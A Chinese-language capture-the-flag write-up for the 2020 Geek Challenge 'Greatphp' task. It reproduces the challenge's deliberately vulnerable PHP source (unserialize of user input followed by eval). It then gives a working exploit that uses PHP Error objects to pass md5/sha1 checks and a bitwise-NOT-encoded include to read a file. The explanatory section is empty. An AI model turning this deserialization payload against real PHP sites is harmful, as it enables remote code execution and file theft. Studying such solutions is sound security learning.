# 原创
：  [极客大挑战 2020]Greatphp

# [极客大挑战 2020]Greatphp

#### [极客大挑战 2020]Greatphp

## 考点

> 
PHP原生类利用、PHP反序列化、md5()和sha1()对类进行hash触发__toString方法


## 思路

> 



> 



> 



## Payload

> 
题给源码


```
&lt;?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){
           if(!preg_match("/\&lt;\?php|\(|\)|\"|\'/", $this-&gt;syc, $match)){
               eval($this-&gt;syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}
?&gt;

```

> 
exp如下：


```
&lt;?php
class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){
           if(!preg_match("/\&lt;\?php|\(|\)|\"|\'/", $this-&gt;syc, $match)){
               eval($this-&gt;syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}
$str = "?&gt;&lt;?=include~".urldecode("%D0%99%93%9E%98")."?&gt;";
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c-&gt;syc = $a;
$c-&gt;lover = $b;
echo(urlencode(serialize($c)));

?&gt;

```
